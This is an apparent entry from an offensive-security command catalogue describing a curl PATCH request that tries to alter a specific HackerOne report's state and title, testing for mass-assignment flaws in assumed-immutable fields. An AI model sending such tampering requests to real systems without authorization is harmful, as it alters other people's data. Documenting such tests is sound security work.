---
id: cmd-curl-patch-report
data: >-
  curl -X PATCH 'https://hackerone.com/reports/1139535' -H 'Authorization:
  Bearer YOUR_TOKEN' -H 'Content-Type: application/json' -d '{"state": "open"}'
tags:
  - api
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:48.177Z'
verified: false
validated: true
submitted: true
---
# curl-patch-report

## Command

```bash
curl -X PATCH 'https://hackerone.com/reports/1139535' -H 'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: application/json' -d '{"state": "open"}'
```

## Description

This command sends a PATCH request to modify a HackerOne report's data, targeting assumed-immutable fields like status, to test for MAID vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PATCH` | Specifies the HTTP method for partial updates | Yes |
| `https://hackerone.com/reports/1139535` | Target report endpoint | Yes |
| `-H 'Authorization: Bearer YOUR_TOKEN'` | Authentication header | Yes |
| `-H 'Content-Type: application/json'` | Sets payload format | Yes |
| `-d '{"state": "open"}'` | JSON payload with modification | Yes |

## Examples

### Basic Usage

```bash
curl -X PATCH 'https://hackerone.com/reports/1139535' -H 'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: application/json' -d '{"state": "open"}'
```

### Advanced Usage

```bash
curl -X PATCH 'https://hackerone.com/reports/1139535' -H 'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: application/json' -d '{"state": "open", "title": "Modified Title"}'
```

## Expected Output

Updated JSON response, e.g., {"id": 1139535, "state": "open"}, confirming the modification if the vulnerability exists.

## Related

- [[Related Procedure|procedures/Modify-Assumed-Immutable-Data-via-API-Manipulation]]
- [[commands/curl-get-report]]
